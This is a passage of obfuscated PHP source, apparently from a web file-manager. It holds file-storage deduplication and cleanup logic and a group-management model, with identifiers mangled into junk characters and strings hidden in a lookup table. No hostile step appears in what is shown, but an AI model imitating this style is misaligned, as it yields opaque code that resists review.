$–¿áëøƒ[$ÁÇá…Ú˜] = $ñ¾³»ÉÌ; } return $–¿áëøƒ[$ÁÇá…Ú˜]; } public function addFileByContent($Ü¥¾Àß = '', $‚ÔÂÅÓî, $ÔŸÏƒ†¦ = '') { $¢ ®‚ø€ =& $_SERVER[¿ÈˆÑ¸ä]; $ï†ÍÓ× = TEMP_PATH . $¢ ®‚ø€[2172]; if (!is_dir($ï†ÍÓ×)) { mk_dir($ï†ÍÓ×); } $ÆÚøâçç = $ï†ÍÓ× . $¢ ®‚ø€[2173] . rand_string(16); $ì—’Âîë = file_put_contents($ÆÚøâçç, $Ü¥¾Àß); if ($ì—’Âîë === !1 || strlen($Ü¥¾Àß) != $ì—’Âîë) { return !1; } $Áîé¸­£ = $this->addFile($ÆÚøâçç, $‚ÔÂÅÓî, $ÔŸÏƒ†¦, !0); if (file_exists($ÆÚøâçç)) { @unlink($ÆÚøâçç); } return $Áîé¸­£; } public function createFileName($‚˜íëûò, $ĞÅøÉõ, $ãÖŞ€¥ = false, $®Òï¾º = false) { $Û†¬—ï =& $_SERVER[¿ÈˆÑ¸ä]; $¤Î¬É¬ = IO::init($Û†¬—ï[8]); $üÙ¥½ğñ = $this->_makeFilePath($‚˜íëûò, $ĞÅøÉõ, $¤Î¬É¬, $ãÖŞ€¥, $®Òï¾º); $‚¶å = $¤Î¬É¬->pathFather($üÙ¥½ğñ); static $¢òÌÖ˜ = false; $­Ë˜­º¨ = $Û†¬—ï[2174] . md5($‚¶å); if (!$¢òÌÖ˜ && !Cache::get($­Ë˜­º¨)) { $¢òÌÖ˜ = !0; $ÛÊÄœ‡ = IO::mkdir($‚¶å); if (!IO::exist($ÛÊÄœ‡ . $Û†¬—ï[885])) { IO::mkfile($ÛÊÄœ‡ . $Û†¬—ï[885]); } Cache::set($­Ë˜­º¨, 1, 3600 * 2); } return $üÙ¥½ğñ; } public function _makeFilePath($–ªÙÒı, $Àîı±Æ‹, $¨”Ÿµ, $ÀÊ—ø²  = false, $»èŠ³áÎ = false) { $¯Ë¬„ØÇ =& $_SERVER[¿ÈˆÑ¸ä]; $êÜÍîÕí = Model($¯Ë¬„ØÇ[856])->get($¯Ë¬„ØÇ[2175]); $¦éİêè± = $¯Ë¬„ØÇ[1361] . $Àîı±Æ‹[$¯Ë¬„ØÇ[483]] . $¯Ë¬„ØÇ[495] . date($¯Ë¬„ØÇ[2176]); $¤¢ÍÊÓ = $¦éİêè± . rand_string(5) . short_id(100); $–ªÙÒı = str_replace($¯Ë¬„ØÇ[8], $¯Ë¬„ØÇ[11], KodIO::clear($–ªÙÒı)); $ùÂˆ÷  = $¨”Ÿµ->ext($–ªÙÒı); if (!$–ªÙÒı) { $êÜÍîÕí = $¯Ë¬„ØÇ[862]; } switch ($êÜÍîÕí) { case $¯Ë¬„ØÇ[2177]: if ($ùÂˆ÷ ) { $¤¢ÍÊÓ = $¤¢ÍÊÓ . $¯Ë¬„ØÇ[10] . $ùÂˆ÷ ; } if ($ùÂˆ÷  == $¯Ë¬„ØÇ[2115]) { $¤¢ÍÊÓ .= $¯Ë¬„ØÇ[1330]; } break; case $¯Ë¬„ØÇ[2178]: $ß¤¢Ò¼¡ = Model($¯Ë¬„ØÇ[856])->get($¯Ë¬„ØÇ[857]); $ÁÃü£ºâ = substr(md5($¯Ë¬„ØÇ[858] . $ß¤¢Ò¼¡ . date($¯Ë¬„ØÇ[832])), 0, 8); $¦éİêè± = $¯Ë¬„ØÇ[1361] . $Àîı±Æ‹[$¯Ë¬„ØÇ[483]] . $¯Ë¬„ØÇ[495] . date($¯Ë¬„ØÇ[2179]) . $ÁÃü£ºâ . $¯Ë¬„ØÇ[8]; if ($ùÂˆ÷  == $¯Ë¬„ØÇ[2115]) { $–ªÙÒı .= $¯Ë¬„ØÇ[1330]; } $œãº¡Ã  = $¯Ë¬„ØÇ[2180] . $¦éİêè± . $–ªÙÒı; CacheLock::lock($œãº¡Ã ); $¤¢ÍÊÓ = $¦éİêè± . $–ªÙÒı; if (IO::exist($¦éİêè± . $–ªÙÒı)) { $ËÔ¨µÕ = substr($–ªÙÒı, 0, strlen($–ªÙÒı) - strlen($ùÂˆ÷ )); $Ê¯’ÜÇ‘ = $»èŠ³áÎ ? substr($»èŠ³áÎ, 0, 5) : ($ÀÊ—ø²  ? substr($ÀÊ—ø² , 0, 5) : rand_string(5)); $Ê¯’ÜÇ‘ .= rand_string(3); $¤¢ÍÊÓ = $¦éİêè± . $ËÔ¨µÕ . $Ê¯’ÜÇ‘; if ($ùÂˆ÷ ) { $¤¢ÍÊÓ = $¤¢ÍÊÓ . $¯Ë¬„ØÇ[10] . $ùÂˆ÷ ; } } if (IO::isOsDriver($¤¢ÍÊÓ) && !IO::isUploadServer($¤¢ÍÊÓ)) { if (IO::exist($¤¢ÍÊÓ)) { CacheLock::unlock($œãº¡Ã ); return $¤¢ÍÊÓ; } $‡şü©Ğ÷ = IO::setContent($¤¢ÍÊÓ, $¯Ë¬„ØÇ[12]); if (!$‡şü©Ğ÷) { show_json($¯Ë¬„ØÇ[2181], !1); } } CacheLock::unlock($œãº¡Ã ); break; case $¯Ë¬„ØÇ[862]: break; default: break; } return $¤¢ÍÊÓ; } public function addFileByRemote($¡Ö–¢Çä, $¥™Á­¥é, $ŒÎŠ¦¸í = array()) { $åÈ“ïÖ¶ =& $_SERVER[¿ÈˆÑ¸ä]; if (!IO::isFile($¡Ö–¢Çä)) { return !1; } $¿Æø†®Ş = $ŒÎŠ¦¸í[$åÈ“ïÖ¶[559]] ? $ŒÎŠ¦¸í[$åÈ“ïÖ¶[559]] : $åÈ“ïÖ¶[12]; $İÛÙšùƒ = IO::hashMd5($¡Ö–¢Çä, $¿Æø†®Ş); $èÑ¿‡é = KodIO::parse($¡Ö–¢Çä); $åèôØÉ = array($åÈ“ïÖ¶[636] => IO::size($¡Ö–¢Çä), $åÈ“ïÖ¶[2182] => 1, $åÈ“ïÖ¶[505] => $¥™Á­¥é, $åÈ“ïÖ¶[899] => $èÑ¿‡é[$åÈ“ïÖ¶[483]], $åÈ“ïÖ¶[506] => $¡Ö–¢Çä, $åÈ“ïÖ¶[2183] => $ŒÎŠ¦¸í[$åÈ“ïÖ¶[691]] ? $ŒÎŠ¦¸í[$åÈ“ïÖ¶[691]] : IO::hashSimple($¡Ö–¢Çä), $åÈ“ïÖ¶[2184] => $İÛÙšùƒ ? $İÛÙšùƒ : $¿Æø†®Ş); if ($Óû¼Ûœ„ = $this->addFileCheckExist($åèôØÉ[$åÈ“ïÖ¶[691]], $åèôØÉ[$åÈ“ïÖ¶[559]], $åèôØÉ[$åÈ“ïÖ¶[79]])) { return $Óû¼Ûœ„; } return $this->addFileData($åèôØÉ); } private function addFileData($æ¯Óô‚ò) { $©²´°Î¨ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$æ¯Óô‚ò) { return !1; } if (!IO::isFile($æ¯Óô‚ò[$©²´°Î¨[87]])) { return !1; } $æ¯Óô‚ò[$©²´°Î¨[79]] = intval($æ¯Óô‚ò[$©²´°Î¨[79]]); if (!$æ¯Óô‚ò[$©²´°Î¨[79]] && strlen($æ¯Óô‚ò[$©²´°Î¨[691]]) > 32) { $æ¯Óô‚ò[$©²´°Î¨[79]] = intval(substr($æ¯Óô‚ò[$©²´°Î¨[691]], 32)); } $àô„ƒÈ‡ = $this->add($æ¯Óô‚ò); return $this->find($àô„ƒÈ‡); } public function addFile($é¬Æ´•, $ã¦¿•êâ, $‰èŠ¬•Ú, $åş…È© = false) { $»œ·ÊÌ =& $_SERVER[¿ÈˆÑ¸ä]; $ıóÇ„­© = IO::hashSimple($é¬Æ´•); $¸ô—ê½• = IO::size($é¬Æ´•); $ïğãÉ” = $¸ô—ê½• <= 1024 * 1024 * 10 ? IO::hashMd5($é¬Æ´•) : $»œ·ÊÌ[12]; $°†â’¤  = $»œ·ÊÌ[2185] . $ıóÇ„­©; CacheLock::lock($°†â’¤ ); if ($ïğãÉ” && $ıóÇ„­©) { $ù×Íã‰± = $this->addFileCheckExist($ıóÇ„­©, $ïğãÉ”, $¸ô—ê½•); if ($ù×Íã‰±) { CacheLock::unlock($°†â’¤ ); return $ù×Íã‰±; } } $¨ã¡ï»Ö = $this->addFileMake($é¬Æ´•, $ã¦¿•êâ, $¸ô—ê½•, $ıóÇ„­©, $ïğãÉ”, $‰èŠ¬•Ú, $åş…È©); $œĞ•ïŸ¹ = $this->addFileData($¨ã¡ï»Ö); if (!$œĞ•ïŸ¹) { return !1; } CacheLock::unlock($°†â’¤ ); if (!$ïğãÉ” && $œĞ•ïŸ¹) { $this->fileMd5Check($œĞ•ïŸ¹); } return $œĞ•ïŸ¹; } public function fileMd5Check($§÷ó¼ş½) { $ô—€Ûƒİ =& $_SERVER[¿ÈˆÑ¸ä]; $òÒÊÓôó = array($§÷ó¼ş½[$ô—€Ûƒİ[553]], $§÷ó¼ş½[$ô—€Ûƒİ[87]]); $ğëı‰¯Ä = $ô—€Ûƒİ[2186] . $§÷ó¼ş½[$ô—€Ûƒİ[87]]; $ÀÂÏÕÒª = $ô—€Ûƒİ[2187] . $§÷ó¼ş½[$ô—€Ûƒİ[553]]; TaskQueue::add($ô—€Ûƒİ[2188], $òÒÊÓôó, $ğëı‰¯Ä, $ÀÂÏÕÒª); } public function fileMd5Set($ã™×®Î, $û½Óï§) { $–û•´®° =& $_SERVER[¿ÈˆÑ¸ä]; $¨µ¾Æëİ = $this->find($ã™×®Î); if (!$¨µ¾Æëİ || $¨µ¾Æëİ[$–û•´®°[559]]) { return; } $ñ’´Ø¾Ì = IO::hashMd5($û½Óï§); if (!$ñ’´Ø¾Ì) { return $–û•´®°[12]; } $this->where(array($–û•´®°[553] => $ã™×®Î))->save(array($–û•´®°[559] => $ñ’´Ø¾Ì)); } public function addFileMake($—‡³Î½, $ÉŒ¹øÒÀ, $­ÑŸ§÷ö, $Ç•Œäï, $˜¸»úö, $Ûœá³²ß, $ùÎ”Á¶½) { $ãëıĞ¾ =& $_SERVER[¿ÈˆÑ¸ä]; $ø¬å§©ş = $this->createFileName($Ûœá³²ß, $ÉŒ¹øÒÀ, $Ç•Œäï, $˜¸»úö); $ÕíÆéğÂ = get_path_father($ø¬å§©ş); $¬‹ü ª = get_path_this($ø¬å§©ş); if ($ùÎ”Á¶½) { $•Î›¦— = IO::move($—‡³Î½, $ÕíÆéğÂ, !1, $¬‹ü ª); } else { $•Î›¦— = IO::copy($—‡³Î½, $ÕíÆéğÂ, !1, $¬‹ü ª); } if (!$•Î›¦—) { return !1; } $Ú¦Š…« = IO::init($•Î›¦—); $Ú¦Š…«->cacheMethod($ãëıĞ¾[180], $Ú¦Š…«->path, $ãëıĞ¾[177]); if (IO::size($•Î›¦—) != $­ÑŸ§÷ö) { return !1; } $º¸ŞÈèë = array($ãëıĞ¾[636] => $­ÑŸ§÷ö, $ãëıĞ¾[2182] => 1, $ãëıĞ¾[505] => $Ûœá³²ß, $ãëıĞ¾[899] => $ÉŒ¹øÒÀ[$ãëıĞ¾[483]], $ãëıĞ¾[506] => $ø¬å§©ş, $ãëıĞ¾[2183] => $Ç•Œäï, $ãëıĞ¾[2184] => $˜¸»úö); return $º¸ŞÈèë; } public function addFileCheckExist($áğøåô¯, $µå«¥Ó‡, $üˆ¼Ö«) { $²€á¡»„ =& $_SERVER[¿ÈˆÑ¸ä]; $Æè¨„™ = $this->findByHash($áğøåô¯, $µå«¥Ó‡); if (!$Æè¨„™) { return !1; } $Ò­ŒÓáÄ = array($²€á¡»„[2182] => intval($Æè¨„™[$²€á¡»„[2189]]) + 1, $²€á¡»„[636] => $üˆ¼Ö«); $this->where(array($²€á¡»„[554] => $Æè¨„™[$²€á¡»„[553]]))->save($Ò­ŒÓáÄ); return $Æè¨„™; } public function remove($Õ˜ãÏÅç) { $this->linkCountChange($Õ˜ãÏÅç, !1); $this->clearEmpty(); return !0; } public function linkAdd($à€ü¹Ä) { $this->linkCountChange($à€ü¹Ä, !0); } public function linkCountChange($Ÿ¤ì’Á×, $à÷«‰§Ø) { $š ØèÇ„ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$Ÿ¤ì’Á×) { return; } if (!is_array($Ÿ¤ì’Á×)) { $Ÿ¤ì’Á× = array($Ÿ¤ì’Á×); } $²İ½“çò = array(); foreach ($Ÿ¤ì’Á× as $¾ª€­Ïî) { $µ‹ï¸»· = $¾ª€­Ïî . $š ØèÇ„[12]; if (!$²İ½“çò[$µ‹ï¸»·]) { $²İ½“çò[$µ‹ï¸»·] = 0; } $²İ½“çò[$µ‹ï¸»·]++; } $Ã÷­¿ = array(); foreach ($²İ½“çò as $¾ª€­Ïî => $¾ çüÚí) { $µ‹ï¸»· = $¾ çüÚí . $š ØèÇ„[12]; if (!$Ã÷­¿[$µ‹ï¸»·]) { $Ã÷­¿[$µ‹ï¸»·] = array(); } $Ã÷­¿[$µ‹ï¸»·][] = $¾ª€­Ïî; } foreach ($Ã÷­¿ as $¾ çüÚí => $¬ÌÔ¬™) { if (!$¬ÌÔ¬™) { continue; } $¾ çüÚí = $à÷«‰§Ø ? $¾ çüÚí : -intval($¾ çüÚí); $ö¯‚¶‹œ = array($š ØèÇ„[553] => array($š ØèÇ„[7], $¬ÌÔ¬™)); if ($¾ çüÚí < 0) { $ö¯‚¶‹œ[$š ØèÇ„[2189]] = array($š ØèÇ„[1118], abs($¾ çüÚí)); } $this->where($ö¯‚¶‹œ)->setAdd($š ØèÇ„[2189], $¾ çüÚí); } } public function findByHash($ÍÒœÒÊÓ, $óÄ˜‚åš = false) { $Ëàõ­² =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ÍÒœÒÊÓ && !$óÄ˜‚åš) { return !1; } $ù¢¦š´é = array($Ëàõ­²[2183] => $ÍÒœÒÊÓ); if ($óÄ˜‚åš) { $ù¢¦š´é = array($Ëàõ­²[2184] => $óÄ˜‚åš); } return $this->order($Ëàõ­²[2190])->where($ù¢¦š´é)->find(); } public function clearEmpty($—Ö´üá„ = 1) { $áÖÌ¶ˆ¬ =& $_SERVER[¿ÈˆÑ¸ä]; $›”ËÁÓ½ = time() - 3600 * 24 * $—Ö´üá„; $¦ØµÖ— = $áÖÌ¶ˆ¬[2191] . $›”ËÁÓ½; $ÒÌî¹éä = $this->where($¦ØµÖ—)->select(); if (!$ÒÌî¹éä) { return; } $«€™ïí = new Task($áÖÌ¶ˆ¬[2192], $áÖÌ¶ˆ¬[12], count($ÒÌî¹éä)); foreach ($ÒÌî¹éä as $á¹¯³Ñ…) { $«€™ïí->update(1); $this->resetFile($á¹¯³Ñ…); } $«€™ïí->end(); } public function resetFile($óâùœç) { $‰£ë‡Ø =& $_SERVER[¿ÈˆÑ¸ä]; $À‰ãçæî = array($‰£ë‡Ø[554] => $óâùœç[$‰£ë‡Ø[553]]); $á¥úôÏù = Model($‰£ë‡Ø[1469])->where($À‰ãçæî)->count(); $‡ş³ıÖ = Model($‰£ë‡Ø[2193])->where($À‰ãçæî)->count(); $…’ùıİÊ = intval($á¥úôÏù) + intval($‡ş³ıÖ); if ($…’ùıİÊ == 0) { Model($‰£ë‡Ø[2194])->delete($óâùœç[$‰£ë‡Ø[553]]); $this->where($À‰ãçæî)->delete(); $this->metaSet($óâùœç[$‰£ë‡Ø[553]], null, null); if (!IO::isFile($óâùœç[$‰£ë‡Ø[87]])) { write_log(array($‰£ë‡Ø[2195], ACTION, $óâùœç), $‰£ë‡Ø[1304]); return !1; } IO::remove($óâùœç[$‰£ë‡Ø[87]]); write_log(ACTION . $‰£ë‡Ø[924] . KodUser::id() . $‰£ë‡Ø[2196] . $óâùœç[$‰£ë‡Ø[553]] . $‰£ë‡Ø[1985] . $óâùœç[$‰£ë‡Ø[79]] . $‰£ë‡Ø[200] . $óâùœç[$‰£ë‡Ø[87]], $‰£ë‡Ø[2195]); return; } if ($óâùœç[$‰£ë‡Ø[2189]] != $…’ùıİÊ) { $this->where($À‰ãçæî)->save(array($‰£ë‡Ø[2182] => $…’ùıİÊ)); } } public function storageInfo($şšìá¶š = false) { $Ë“œøÑ˜ =& $_SERVER[¿ÈˆÑ¸ä]; $ÇéŞ²Ÿà = $this->count() + 0.0; $¯êöÊ¢ï = 0; $ùœ‡Ö¥Á = 1; $›©öÛØ† = 0; $»èšĞîã = 5000; for ($¡Œ÷ºì˜ = 0; $¡Œ÷ºì˜ < $ÇéŞ²Ÿà; $¡Œ÷ºì˜ = $¡Œ÷ºì˜ + $»èšĞîã) { $öã•çÕ = $this->limit($¡Œ÷ºì˜, $¡Œ÷ºì˜ + $»èšĞîã)->select(); foreach ($öã•çÕ as $´•‘ºÛ) { $ùœ‡Ö¥Á += $´•‘ºÛ[$Ë“œøÑ˜[79]] * $´•‘ºÛ[$Ë“œøÑ˜[2189]]; $¯êöÊ¢ï += $´•‘ºÛ[$Ë“œøÑ˜[79]] * ($´•‘ºÛ[$Ë“œøÑ˜[2189]] - 1); $›©öÛØ† += $´•‘ºÛ[$Ë“œøÑ˜[2189]]; } } $ÇŞŸ†±“ = array($Ë“œøÑ˜[2197] => $ùœ‡Ö¥Á, $Ë“œøÑ˜[2198] => $¯êöÊ¢ï, $Ë“œøÑ˜[2199] => $¯êöÊ¢ï / $ùœ‡Ö¥Á, $Ë“œøÑ˜[83] => $ÇéŞ²Ÿà, $Ë“œøÑ˜[2200] => $›©öÛØ†); return $ÇŞŸ†±“; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\160"; protected $tableMeta = array("\x74\x61\142\154\x65\116\141\x6d\x65" => "\x67\162\x6f\x75\160\137\x6d\x65\x74\141", "\155\x65\164\141\x46\x69\x65\154\144" => "\x67\x72\157\x75\160\x49\x44"); protected function cacheFunctionAlias($Öåç¤¹˜) { $·ËÏ“« =& $_SERVER[¿ÈˆÑ¸ä]; return array($·ËÏ“«[2201] => array($Öåç¤¹˜[0], $·ËÏ“«[2202]), $·ËÏ“«[2203] => array($Öåç¤¹˜[0], $·ËÏ“«[2204])); } protected function ___getInfo($ºòÙÓ´§) { $Åà£˜™¬ = $this->getInfoSimple($ºòÙÓ´§); if (!$Åà£˜™¬) { return !1; } return $this->_listDataApplyItem($Åà£˜™¬); } protected function ___getInfoSimple($œ×ñ÷°³) { $Ç•¾Ç—ñ = array($_SERVER[¿ÈˆÑ¸ä][1431] => intval($œ×ñ÷°³)); $‘Ì†’„¼ = $this->where($Ç•¾Ç—ñ)->find(); return is_array($‘Ì†’„¼) ? $‘Ì†’„¼ : array(); } protected function groupAdd($…§Ó‰Ã) { $ˆ«ùœšĞ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$…§Ó‰Ã[$ˆ«ùœšĞ[191]] && isset($…§Ó‰Ã[$ˆ«ùœšĞ[1431]]) && $…§Ó‰Ã[$ˆ«ùœšĞ[1431]] == 1) { if ($ïñŞ¬ä’ = $this->getInfoSimple($…§Ó‰Ã[$ˆ«ùœšĞ[1431]], !0)) { return $…§Ó‰Ã[$ˆ«ùœšĞ[1431]]; } } else { $ïñŞ¬ä’ = $this->getInfoSimple($…§Ó‰Ã[$ˆ«ùœšĞ[191]]); if (!$ïñŞ¬ä’) { return !1; } } $Ô¨äÛí‹ = $ˆ«ùœšĞ[609]; if ($ïñŞ¬ä’[$ˆ«ùœšĞ[600]]) { $Ô¨äÛí‹ = $ïñŞ¬ä’[$ˆ«ùœšĞ[600]] . $ïñŞ¬ä’[$ˆ«ùœšĞ[1431]] . $ˆ«ùœšĞ[50]; } $ö’’…†œ = array($ˆ«ùœšĞ[505] => $this->groupNameAuto($…§Ó‰Ã[$ˆ«ùœšĞ[191]], $…§Ó‰Ã[$ˆ«ùœšĞ[32]]), $ˆ«ùœšĞ[488] => $…§Ó‰Ã[$ˆ«ùœšĞ[191]], $ˆ«ùœšĞ[671] => $Ô¨äÛí‹, $ˆ«ùœšĞ[2205] => $…§Ó‰Ã[$ˆ«ùœšĞ[2109]], $ˆ«ùœšĞ[2206] => 0, $ˆ«ùœšĞ[2126] => 0); $…§Ó‰Ã[$ˆ«ùœšĞ[32]] = $ö’’…†œ[$ˆ«ùœšĞ[32]]; if (isset($…§Ó‰Ã[$ˆ«ùœšĞ[2144]])) { $ö’’…†œ[$ˆ«ùœšĞ[2144]] = $…§Ó‰Ã[$ˆ«ùœšĞ[2144]]; } else { $‘Ö’Û¤ì = $this->max($ˆ«ùœšĞ[2144]); if (!$‘Ö’Û¤ì) { $‘Ö’Û¤ì = 0; } $ö’’…†œ[$ˆ«ùœšĞ[2144]] = $‘Ö’Û¤ì + 1; } if (!empty($…§Ó‰Ã[$ˆ«ùœšĞ[1431]])) { $ö’’…†œ[$ˆ«ùœšĞ[1431]] = $…§Ó‰Ã[$ˆ«ùœšĞ[1431]]; } $¶¿ÊÁ‰Ô = $this->add($ö’’…†œ); $this->groupMetaEdit($¶¿ÊÁ‰Ô, $…§Ó‰Ã); Model($ˆ«ùœšĞ[1469])->groupRootAdd($¶¿ÊÁ‰Ô); $this->_clearCache($…§Ó‰Ã[$ˆ«ùœšĞ[191]]); return $¶¿ÊÁ‰Ô; } protected function groupEdit($ñ¾¿´ä, $õôÀ™ú) { $şÜš‚‰Š =& $_SERVER[¿ÈˆÑ¸ä]; $Å°à÷¸İ = $this->getInfoSimple($ñ¾¿´ä); if (!$Å°à÷¸İ) { return !1; } if (!empty($õôÀ™ú[$şÜš‚‰Š[191]])) { $µ®­§±å = $this->getInfoSimple($õôÀ™ú[$şÜš‚‰Š[191]]); if (!$µ®­§±å) { return !1; } if ($Å°à÷¸İ[$şÜš‚‰Š[1431]] == $µ®­§±å[$şÜš‚‰Š[1431]]) { return !1; } if ($õôÀ™ú[$şÜš‚‰Š[191]] != $Å°à÷¸İ[$şÜš‚‰Š[191]]) { if ($µ®­§±å[$şÜš‚‰Š[600]] !== $Å°à÷¸İ[$şÜš‚‰Š[600]] && strpos($µ®­§±å[$şÜš‚‰Š[600]], $Å°à÷¸İ[$şÜš‚‰Š[600]] . $Å°à÷¸İ[$şÜš‚‰Š[1431]] . $şÜš‚‰Š[50]) === 0) { return !1; } $õôÀ™ú[$şÜš‚‰Š[671]] = $µ®­§±å[$şÜš‚‰Š[600]] . $õôÀ™ú[$şÜš‚‰Š[191]] . $şÜš‚‰Š[50]; $this->_changeChildLevel($Å°à÷¸İ, $µ®­§±å); $this->_clearCache($µ®­§±å[$şÜš‚‰Š[1431]]); $this->_clearCache($Å°à÷¸İ[$şÜš‚‰Š[191]]); } } $this->groupMetaEdit($ñ¾¿´ä, $õôÀ™ú); $this->_clearChildrenCache($Å°à÷¸İ); return $this->where(array($şÜš‚‰Š[2207] => $ñ¾¿´ä))->save($õôÀ™ú); } private function groupMetaEdit($£©¦äÙ•, &$ÉŸüœ¤) { $Ø±ÖàÇå =& $_SERVER[¿ÈˆÑ¸ä]; if (isset($ÉŸüœ¤[$Ø±ÖàÇå[32]])) { $this->setNamePinyin($£©¦äÙ•, $ÉŸüœ¤[$Ø±ÖàÇå[32]]); } if (isset($ÉŸüœ¤[$Ø±ÖàÇå[2208]])) { $ë•ãŠ× = array($Ø±ÖàÇå[2208] => $ÉŸüœ¤[$Ø±ÖàÇå[2208]], $Ø±ÖàÇå[2209] => $ÉŸüœ¤[$Ø±ÖàÇå[2209]]); unset($ÉŸüœ¤[$Ø±ÖàÇå[2208]]); unset($ÉŸüœ¤[$Ø±ÖàÇå[2209]]); if (isset($ÉŸüœ¤[$Ø±ÖàÇå[2210]])) { $˜Â§Ø® = $Ø±ÖàÇå[1427] . $£©¦äÙ•; $àï­ğå = $Ø±ÖàÇå[1426]; $Ğ’¶Æ­¢ = $ÉŸüœ¤[$Ø±ÖàÇå[2210]] ? $ÉŸüœ¤[$Ø±ÖàÇå[2210]] : $Ø±ÖàÇå[12]; $ïĞ®·İ = Model($Ø±ÖàÇå[1425])->get($˜Â§Ø®, $àï­ğå); $ïĞ®·İ = $ïĞ®·İ ? $ïĞ®·İ : $Ø±ÖàÇå[12]; if ($ïĞ®·İ != $Ğ’¶Æ­¢) { if (!$Ğ’¶Æ­¢ && $ïĞ®·İ) { Model($Ø±ÖàÇå[1425])->remove($˜Â§Ø®, $àï­ğå); } else { if ($Ğ’¶Æ­¢) { Model($Ø±ÖàÇå[1425])->set($˜Â§Ø®, $Ğ’¶Æ­¢, $àï­ğå); } } } $ë•ãŠ×[$Ø±ÖàÇå[2210]] = $Ğ’¶Æ­¢; } $this->metaSet($£©¦äÙ•, $ë•ãŠ×); } } private function _clearChildrenCache($ÈÎÂ½÷ä) { $ù«‡Ê› =& $_SERVER[¿ÈˆÑ¸ä]; $²¥Ğå» = array($ù«‡Ê›[671] => array($ù«‡Ê›[631], $ÈÎÂ½÷ä[$ù«‡Ê›[600]] . $ÈÎÂ½÷ä[$ù«‡Ê›[1431]] . $ù«‡Ê›[632])); $èÚÛ©³ = $this->field($ù«‡Ê›[1431])->where($²¥Ğå»)->select(); foreach ($èÚÛ©³ as $İœ·û©) { $this->_clearCache($İœ·û©[$ù«‡Ê›[1431]]); } } private function _clearCache($ıéá¸¶¾) { $ÒŞ‚âçõ =& $_SERVER[¿ÈˆÑ¸ä]; $this->cacheFunctionClear($ÒŞ‚âçõ[2211], $ıéá¸¶¾); $this->cacheFunctionClear($ÒŞ‚âçõ[2212], $ıéá¸¶¾); } private function _changeChildLevel($Û‰·²ı, $èÒÚ°Óè, $‹ÙãËüÚ = false) { $Œ÷÷ÇÃË =& $_SERVER[¿ÈˆÑ¸ä]; $ºÏ¦¸­× = $Û‰·²ı[$Œ÷÷ÇÃË[600]] . $Û‰·²ı[$Œ÷÷ÇÃË[1431]] . $Œ÷÷ÇÃË[50]; $Ëêøû¾ì = $èÒÚ°Óè[$Œ÷÷ÇÃË[600]] . $èÒÚ°Óè[$Œ÷÷ÇÃË[1431]] . $Œ÷÷ÇÃË[50] . $Û‰·²ı[$Œ÷÷ÇÃË[1431]] . $Œ÷÷ÇÃË[50]; if ($‹ÙãËüÚ) { $Ëêøû¾ì = $èÒÚ°Óè[$Œ÷÷ÇÃË[600]] . $èÒÚ°Óè[$Œ÷÷ÇÃË[1431]] . $Œ÷÷ÇÃË[50]; } $‘åßã = array($Œ÷÷ÇÃË[671] => array($Œ÷÷ÇÃË[631], $Û‰·²ı[$Œ÷÷ÇÃË[600]] . $Û‰·²ı[$Œ÷÷ÇÃË[1431]] . $Œ÷÷ÇÃË[632])); $ø†”Ö¾Æ = array($Œ÷÷ÇÃË[671] => array($Œ÷÷ÇÃË[680], "\162\145\160\154\141\143\x65\x28\160\141\162\x65\156\164\114\145\166\x65\x6c\x2c\47{$ºÏ¦¸­×}\x27\54\x27{$Ëêøû¾ì}\x27\51")); $this->_clearChildrenCache($Û‰·²ı); $this->where($‘åßã)->data($ø†”Ö¾Æ)->save(); } public function setNamePinyin($¹ëâÓ‡, $Êˆ’Øõæ = false) { $Œæ×Ï• =& $_SERVER[¿ÈˆÑ¸ä]; if (!$Êˆ’Øõæ) { $ÜÛ¨˜¿¯ = $this->getInfoSimple($¹ëâÓ‡); $Êˆ’Øõæ = $ÜÛ¨˜¿¯[$Œæ×Ï•[32]]; } if (!Input::check($Êˆ’Øõæ, $Œæ×Ï•[674])) { $this->metaSet($¹ëâÓ‡, $Œæ×Ï•[548], null); $this->metaSet($¹ëâÓ‡, $Œæ×Ï•[547], null); return; } $íÂÇğÖ‰ = array($Œæ×Ï•[548] => str_replace($Œæ×Ï•[53], $Œæ×Ï•[12], Pinyin::get($Êˆ’Øõæ)), $Œæ×Ï•[547] => Pinyin::get($Êˆ’Øõæ, $Œæ×Ï•[675])); $this->metaSet($¹ëâÓ‡, $íÂÇğÖ‰); } protected function metaSet($çœËúà, $ù¿‰ö× = null, $ıïƒ÷“Í = null) { $this->_clearCache($çœËúà); return parent::metaSet($çœËúà, $ù¿‰ö×, $ıïƒ÷“Í); } protected function groupStatus($´½»Áš†, $ê±ÑÍ¡) { $Í©ƒœğ¡ =& $_SERVER[¿ÈˆÑ¸ä]; $¼Ğò†¯§ = $this->getInfoSimple($´½»Áš†); if (!$¼Ğò†¯§) { return !1; } $this->_clearCache($´½»Áš†); return $this->metaSet($´½»Áš†, $Í©ƒœğ¡[833], $ê±ÑÍ¡); if ($ê±ÑÍ¡ == $Í©ƒœğ¡[91]) { $ñîÓÖâç = $this->parentLevelArray($¼Ğò†¯§[$Í©ƒœğ¡[600]]); } else { } $ñîÓÖâç[] = $¼Ğò†¯§[$Í©ƒœğ¡[1431]]; $–‘íÊ” = array(); foreach ($ñîÓÖâç as $´½»Áš†) { $–‘íÊ”[] = array($Í©ƒœğ¡[1431] => $´½»Áš†, $Í©ƒœğ¡[95] => $Í©ƒœğ¡[833], $Í©ƒœğ¡[451] => $ê±ÑÍ¡); $this->_clearCache($´½»Áš†); } return Model($Í©ƒœğ¡[2213])->addAll($–‘íÊ”, array(), !0); } protected function groupRemove($ŸÁÒ¯÷™, $Æ¦ßş‘ú = false) { $³¼ÍÍÅ³ =& $_SERVER[¿ÈˆÑ¸ä]; $£Í øËŠ = array($³¼ÍÍÅ³[1431] => $ŸÁÒ¯÷™); $İ§ë‰Ä« = $this->where($£Í øËŠ)->find(); if (!$İ§ë‰Ä« || $İ§ë‰Ä«[$³¼ÍÍÅ³[191]] == 0) { return !1; } if (!$Æ¦ßş‘ú) { $Üâ¡àµ = $this->getInfoSimple($İ§ë‰Ä«[$³¼ÍÍÅ³[191]]); $this->_changeChildLevel($İ§ë‰Ä«, $Üâ¡àµ, !0); $this->where(array($³¼ÍÍÅ³[191] => $ŸÁÒ¯÷™))->save(array($³¼ÍÍÅ³[191] => $İ§ë‰Ä«[$³¼ÍÍÅ³[191]])); $this->_clearCache($Üâ¡àµ[$³¼ÍÍÅ³[1431]]); } 